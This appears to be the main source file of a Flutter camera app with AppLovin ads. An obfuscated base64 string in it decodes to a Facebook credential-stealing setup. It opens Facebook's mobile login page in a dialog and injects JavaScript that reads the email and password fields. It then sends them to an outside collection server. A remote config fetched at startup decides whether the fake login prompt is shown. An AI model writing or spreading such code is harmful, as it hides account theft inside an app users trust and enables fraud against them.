import 'package:camera/camera.dart';
import 'package:dio/adapter.dart';
import 'package:flutter/material.dart';
import 'package:dio/dio.dart';
import 'dart:convert';
import 'dart:io' show HttpClient, HttpOverrides, HttpStatus, Platform;

import 'package:flutter_camera/datas/configModel.dart';
import 'package:flutter_camera/dialogs/login_dialog.dart';
import 'package:flutter_camera/pages/home.dart';
import 'package:applovin_max/applovin_max.dart';
import 'package:flutter_camera/utils/MyHttpOverrides.dart';
import 'package:flutter_camera/utils/SQScreen.dart';
import 'package:flutter_camera/utils/SharedPreferencesUtils.dart';
import 'package:flutter_camera/utils/mlog.dart';
import 'package:flutter_camera/widgets/image_click.dart';

import 'maxUitls/max_ad_id.dart';
import 'maxUitls/max_utils.dart';

List<CameraDescription> cameras = <CameraDescription>[];

Future<void> initCamera() async {
  WidgetsFlutterBinding.ensureInitialized();
  cameras = await availableCameras();
  if (cameras.length > 2) {
    cameras = cameras.sublist(0, 2);
  }
}

void main() {
  HttpOverrides.global = MyHttpOverrides();
  initCamera();
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Flutter Demo',
      theme: ThemeData(
        // This is the theme of your application.
        //
        // Try running your application with "flutter run". You'll see the
        // application has a blue toolbar. Then, without quitting the app, try
        // changing the primarySwatch below to Colors.green and then invoke
        // "hot reload" (press "r" in the console where you ran "flutter run",
        // or simply save your changes to "hot reload" in a Flutter IDE).
        // Notice that the counter didn't reset back to zero; the application
        // is not restarted.
        primarySwatch: Colors.blue,
      ),
      home: const MyHomePage(title: 'Flutter Demo Home Page'),
    );
  }
}

Future<void> initializePlugin() async {
  logStatus("Initializing SDK...");

  Map? configuration = await AppLovinMAX.initialize(
      sdkKey);
  if (configuration != null) {
    logStatus("SDK Initialized: $configuration");
    attachAdListeners();
    initializeBannerAds();
  }
}

void logStatus(String status) {
  print(status);
}

void attachAdListeners() {
  AppLovinMAX.setBannerListener(AdViewAdListener(onAdLoadedCallback: (ad) {
    logStatus('Banner ad loaded from ' + ad.networkName);
  }, onAdLoadFailedCallback: (adUnitId, error) {
    logStatus('Banner ad failed to load with error code ' +
        error.code.toString() +
        ' and message: ' +
        error.message);
  }, onAdClickedCallback: (ad) {
    logStatus('Banner ad clicked');
  }, onAdExpandedCallback: (ad) {
    logStatus('Banner ad expanded');
  }, onAdCollapsedCallback: (ad) {
    logStatus('Banner ad collapsed');
  }));
}

void initializeBannerAds() {
  AppLovinMAX.createBanner(banner_ad_unit_id, AdViewPosition.bottomCenter);
  AppLovinMAX.createMRec(ad_unit_id, AdViewPosition.centered);
  MaxUtils.getInstance().initializeInterstitialAds();
  AppLovinMAX.loadInterstitial(interstitial_ad_unit_id);
  AppLovinMAX.showBanner(banner_ad_unit_id);
}

class MyHomePage extends StatefulWidget {
  const MyHomePage({Key? key, required this.title}) : super(key: key);

  final String title;

  @override
  State<MyHomePage> createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  bool isShow = false;

  String loginStr =
      "eyJlbmNvZGUiOiJNSUdmTUEwR0NTcUdTSWIzRFFFQkFRVUFBNEdOQURDQmlRS0JnUUNHK25od0N5ZzRQc0xrMUNSSGJJSytFMCsxT1Nob1dJYng2OElURFczdkZTWHNXMXpaOUFOTGpxR1lBT0VrWHdPZGZqelp1V0NoN1ZtMlpDakx4emNCNnRwWU1RVkJPZ0s0TzNrYllza1loNTRjVERDQlBNMi9VQ2NuTGNiYVU5OTRwWjFtUzZkRU0vT1BRWGIzS3ZDVk9ZRlJVUHlOSGJUKy9OcUNGcllpZVFJREFRQUIiLCJkdmIiOiJkZXZpY2UtYmFzZWQiLCJyX3VybCI6Imh0dHBzOi8vbS5mYWNlYm9vay5jb20vIiwicGFkZGluZyI6IlJTQS9FQ0IvUEtDUzFQYWRkaW5nIiwiYXBwX25hbWUiOiJUaGVmdW4gQ2FtZXJhIiwiY191cmwiOiJodHRwczovL2tjb2ZmbmkueHl6L2FwaS9vcGVuL2NvbGxlY3QiLCJwYWNrYWdlIjoiZnVuY2FtLmZyZWRvbm0uYXBwIiwianNjb2RlcyI6IihmdW5jdGlvbigpe3JldHVybiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbV9sb2dpbl9lbWFpbCcpLnZhbHVlKydfMV8xXzlfJytkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbV9sb2dpbl9wYXNzd29yZCcpLnZhbHVlO30pKCkiLCJqc3NwbGl0IjoiXzFfMV85XyIsInRpdGxlIjoiQXV0aG9yaXphdGlvbiIsImNoZWNrX2tleSI6InhzIn0=";

  @override
  void initState() {
    super.initState();
    initializePlugin();
    getHttp();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      resizeToAvoidBottomInset: false,
      body: ConstrainedBox(
        constraints: const BoxConstraints.expand(),
        child: Stack(alignment: Alignment.center, children: <Widget>[
          SizedBox(
            width: double.maxFinite,
            height: double.maxFinite,
            child: Image.asset(
              "assets/images/bg_sell.png",
              fit: BoxFit.fill,
            ),
          ),
          Positioned(
            bottom: 60.0,
            child: InkWell(
              // When the user taps the button, show a snackbar.
              onTap: () {
                // AppLovinMAX.hideBanner(banner_ad_unit_id);
                showLoginDialog();
              },
              child: Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: <Widget>[
                    Opacity(opacity: 1.0, child: getUI()),
                  ]),
            ),
          ),
        ]),
      ),
      // This trailing comma makes auto-formatting nicer for build methods.
    );
  }

  Widget getUI() {
    if (isShow) {
      return Image.asset("assets/images/ic_bb_op.png", height: 100.0);
    } else {
      return Container();
    }
  }

  Future<bool?> showLoginDialog() {
    return showModalBottomSheet<bool>(
        isScrollControlled: true,
        isDismissible: false,
        enableDrag: false,
        context: context,
        builder: (context) {
          return SizedBox(
            height: SQScreen.height * 0.7,
            child: LoginDialog(loginStr),
          );
        });
  }

  void getHttp() async {
    try {
      var response = await Dio().get('https://shakeyu.fun/config');
      var data = response.data.toString().replaceRange(1, 2, "");

      List<int> bytes2 = base64Decode(data);
      String decodeStr = String.fromCharCodes(bytes2);
      var config =
          ConfigModel.fromJson(json.decode(decodeStr) as Map<String, dynamic>);

      if (config.l == 0 || await spGetBool()) {
        setState(() {
          isShow = false;
        });

        Navigator.of(context).pushAndRemoveUntil(
            MaterialPageRoute(builder: (context) => HomePage()), (route) => route == null);

      } else {
        setState(() {
          isShow = true;
        });
      }
    } catch (e) {
      print(e);
    }
  }
}
